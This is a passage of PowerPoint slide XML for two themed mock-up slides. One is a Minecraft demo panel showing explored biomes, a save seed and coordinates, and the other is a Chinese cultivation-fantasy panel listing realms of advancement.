          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="136" name="Shape 134"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3758301" y="3303124"/>
              <a:ext cx="5241841" cy="719292"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1A1A1A"/>
            </a:solidFill>
            <a:ln w="25400">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="137" name="Text 135"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3848212" y="3375053"/>
              <a:ext cx="3596460" cy="1438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750" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FFFF55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🗺 已探索生物群系</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="138" name="Shape 136"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="139" name="Text 137"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3902159" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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🌿 森林</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="140" name="Shape 138"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4396673" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="141" name="Text 139"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4414655" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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🏜 沙漠</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="142" name="Shape 140"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4909168" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="143" name="Text 141"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4927150" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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❄️ 冻原</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="144" name="Shape 142"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5421664" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="145" name="Text 143"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5439646" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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🌊 海洋</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="146" name="Shape 144"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5934159" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="147" name="Text 145"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5952142" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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🍄 菌岛</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="148" name="Shape 146"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6446655" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="149" name="Text 147"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6464637" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF555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🌋 下界</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="150" name="Shape 148"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6959150" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="151" name="Text 149"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6977133" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="AA55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🌌 末地</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="152" name="Shape 150"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7471646" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="153" name="Text 151"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7489628" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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🏔 山地</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="154" name="Shape 152"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7984142" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="155" name="Text 153"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8002124" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF5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🎋 竹林</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="156" name="Shape 154"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8496637" y="3554876"/>
              <a:ext cx="467540" cy="269735"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="333333"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A5A5A"/>
              </a:solidFill>
              <a:prstDash val="solid"/>
            </a:ln>
          </p:spPr>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="157" name="Text 155"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8514619" y="3572858"/>
              <a:ext cx="431575" cy="2337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525" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="55FF55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🌸 繁花林</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="158" name="Text 156"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3884177" y="3860575"/>
              <a:ext cx="4855221" cy="1258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AAAAA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已探索: 10/43 种生物群系  ·  探索进度: 23%</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Shape 157"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6054416"/>
            <a:ext cx="9144000" cy="43157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0" y="6054416"/>
            <a:ext cx="9144000" cy="35965"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A5A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0" y="6450027"/>
            <a:ext cx="9144000" cy="35965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25876" y="6090381"/>
            <a:ext cx="359646" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9B9B9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143858" y="6108363"/>
            <a:ext cx="323681" cy="287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♥</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Text 162"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323681" y="6306168"/>
            <a:ext cx="143858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525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525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Shape 163"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="557451" y="6090381"/>
            <a:ext cx="359646" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B8B8B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="373737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575434" y="6108363"/>
            <a:ext cx="323681" cy="287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🛡️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="Text 165"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755257" y="6306168"/>
            <a:ext cx="143858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525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525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Shape 166"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="989027" y="6090381"/>
            <a:ext cx="359646" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B8B8B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="373737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1007009" y="6108363"/>
            <a:ext cx="323681" cy="287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⭐</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Text 168"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1186832" y="6306168"/>
            <a:ext cx="143858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525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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Shape 169"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1420602" y="6090381"/>
            <a:ext cx="359646" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B8B8B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="373737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1438584" y="6108363"/>
            <a:ext cx="323681" cy="287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💎</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="173" name="Text 171"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1618407" y="6306168"/>
            <a:ext cx="143858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525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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="174" name="Shape 172"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1852177" y="6090381"/>
            <a:ext cx="359646" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B8B8B"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="373737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1870159" y="6108363"/>
            <a:ext cx="323681" cy="287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🏆</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="176" name="Text 174"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2049982" y="6306168"/>
            <a:ext cx="143858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525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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Text 175"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2427611" y="6108363"/>
            <a:ext cx="4675398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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="55F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当前存档: “极限生存” · 硬核模式 · 种子: 3748291056</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Text 176"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5394690" y="6234239"/>
            <a:ext cx="3596460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X: 428   Y: 64   Z: -1247  |  难度: 困难  |  光照: 15</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name="Shape 177"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6485991"/>
            <a:ext cx="9144000" cy="179823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143858" y="6512965"/>
            <a:ext cx="4495575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MINECRAFT DEMO · 我的世界 · Java Edition 1.21.4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Text 179"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5035044" y="6512965"/>
            <a:ext cx="3956106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525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02 / 06 · THEME: MINECRAFT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5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50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186"/>
            <a:ext cx="9144000" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D04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1566"/>
            <a:ext cx="9144000" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B873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1841" y="282097"/>
            <a:ext cx="449558" cy="449558"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0500"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B873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1841" y="282097"/>
            <a:ext cx="449558" cy="449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FFD7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☯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0" y="264115"/>
            <a:ext cx="9144000" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw blurRad="50800" dist="50800" dir="16200000" algn="bl" rotWithShape="0">
              <a:srgbClr val="FF6600">
                <a:alpha val="4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kern="0" spc="800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荒 独 断 万 古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0" y="605779"/>
            <a:ext cx="9144000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13" kern="0" spc="200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B6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❖ 一人之道，逆伐苍稹，碎虚空，断轮回 ❖</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="713" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7552566" y="282097"/>
            <a:ext cx="1420602" cy="179823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="200800"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B3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52566" y="282097"/>
            <a:ext cx="1420602" cy="1798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CC8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当前境界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7552566" y="479903"/>
            <a:ext cx="1420602" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw blurRad="38100" dist="50800" dir="16200000" algn="bl" rotWithShape="0">
              <a:srgbClr val="FF6600">
                <a:alpha val="5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化神·九重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0" y="839549"/>
            <a:ext cx="9144000" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A050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46903" y="2439973"/>
            <a:ext cx="179823" cy="3596460"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D04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05664" y="839549"/>
            <a:ext cx="143858" cy="2697345"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2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41628" y="839549"/>
            <a:ext cx="71929" cy="1798230"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="33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839549"/>
            <a:ext cx="2697345" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="110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79363" y="839549"/>
            <a:ext cx="17982" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6B3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558841"/>
            <a:ext cx="26973" cy="3596460"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B873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929460"/>
            <a:ext cx="2697345" cy="197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5" b="1" kern="0" spc="200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修炼境界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179823" y="1145248"/>
            <a:ext cx="2337699" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6B3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929" y="1235159"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B3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5876" y="1307088"/>
            <a:ext cx="215788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B6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77628" y="1307088"/>
            <a:ext cx="1438584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5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炼体境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798230" y="1307088"/>
            <a:ext cx="809204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3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已渡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71929" y="1693708"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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5876" y="1765637"/>
            <a:ext cx="215788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B6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77628" y="1765637"/>
            <a:ext cx="1438584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5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聚气境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798230" y="1765637"/>
            <a:ext cx="809204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3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已渡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71929" y="2152257"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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5876" y="2224186"/>
            <a:ext cx="215788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B6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77628" y="2224186"/>
            <a:ext cx="1438584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5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筑基境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798230" y="2224186"/>
            <a:ext cx="809204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3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已渡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71929" y="2610805"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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5876" y="2682735"/>
            <a:ext cx="215788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B6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77628" y="2682735"/>
            <a:ext cx="1438584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5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金丹境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798230" y="2682735"/>
            <a:ext cx="809204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3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已渡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71929" y="3069354"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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5876" y="3141283"/>
            <a:ext cx="215788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B6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77628" y="3141283"/>
            <a:ext cx="1438584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5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元婴境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798230" y="3141283"/>
            <a:ext cx="809204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3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已渡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71929" y="3527903"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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5876" y="3599832"/>
            <a:ext cx="215788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B6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77628" y="3599832"/>
            <a:ext cx="1438584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5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化神境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798230" y="3599832"/>
            <a:ext cx="809204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3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一至八重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71929" y="3986451"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A1000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5876" y="4058381"/>
            <a:ext cx="215788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►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77628" y="4058381"/>
            <a:ext cx="1438584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化神·九重</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="4058381"/>
            <a:ext cx="809204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至臻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71929" y="4445000"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="AA44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5876" y="4516929"/>
            <a:ext cx="215788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B6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77628" y="4516929"/>
            <a:ext cx="1438584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25" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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度劫境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1798230" y="4516929"/>
            <a:ext cx="809204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6B3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突破中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71929" y="4903549"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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25876" y="4975478"/>
            <a:ext cx="215788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377628" y="4975478"/>
            <a:ext cx="1438584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25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大乘境</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Text 54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="4975478"/>
